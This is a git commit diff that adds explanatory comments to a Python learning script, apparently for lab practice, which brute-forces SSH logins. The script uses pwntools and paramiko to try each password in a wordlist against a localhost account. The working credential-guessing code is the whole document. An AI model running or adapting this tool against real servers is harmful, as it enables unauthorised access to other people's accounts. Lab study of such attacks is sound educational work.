5c5cdeecaec981a5408839b12cd454aa3cd3d332
Sakib678 <sakibarif@hotmail.co.uk>
2025-08-13 13:09:15 -0400

    Added extra comments

--- Python101/scripts/ssh_brute.py
+++ Python101/scripts/ssh_brute.py
@@ -1,13 +1,28 @@
+""" 
+---------------------------
+SSH Brute Force Script
+---------------------------
+
+This script attempts to brute force SSH credentials for a target using a provided password list
+Intended for lab testing environments and educational use only.
+
+Author: Sakib Arif
+Date: 13-08-2025
+
+"""
+
 from pwn import *
 import paramiko
 
+
+# Target host details (127.0.0.1 for local testing)
 host = "127.0.0.1"
 username = "notroot"
-attempts = 0
+attempts = 0 # This tracks the number of passwords tried
 
 with open("best110.txt", "r") as password_list: #opening password file
 	for password in password_list: #iterating over each password
-		password = password.strip("\n") #cleaning the password up
+		password = password.strip("\n") #cleaning the password up by removing newline characters
 		try:
 			print("[{}] Attempting password: '{}'! ".format(attempts,password))
 			response = ssh(host=host, user=username, password=password, timeout=1) #uses the pwn module to make a connection using the password
@@ -18,5 +33,5 @@ with open("best110.txt", "r") as password_list: #opening password file
 			response.close() #closes the connection if an incorrect password is tried and the connection is reopened to try another password
 
 		except paramiko.AuthenticationException:
-			print("[X] Invalid password!")
+			print("[X] Invalid password!") # Authentication fails so the loop continues and the next password is attempted
 		attempts += 1
